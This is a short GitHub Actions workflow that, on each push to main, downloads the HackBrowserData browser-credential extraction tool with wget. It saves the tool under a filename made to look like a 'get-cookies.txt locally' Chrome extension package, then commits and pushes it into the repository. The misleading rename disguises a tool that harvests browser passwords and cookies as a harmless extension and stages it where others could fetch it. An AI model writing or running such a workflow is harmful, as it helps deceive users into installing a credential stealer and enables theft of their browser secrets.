name: test 2
  
on: 
  push:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: setup 
      uses: actions/checkout@v4

    - name: Download file with wget
      run: |
          wget -O get-cookies.txt-locally_v0.7.2_chrome.zip \
          "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-linux-64bit.zip"


    - name: Commit and push
      run: |
          git config user.name "github-actions"
          git config user.email "github-actions@github.com"
          git add get-cookies.txt-locally_v0.7.2_chrome.zip
          git commit -m "Done" || echo "No changes"
          git push  
          
      

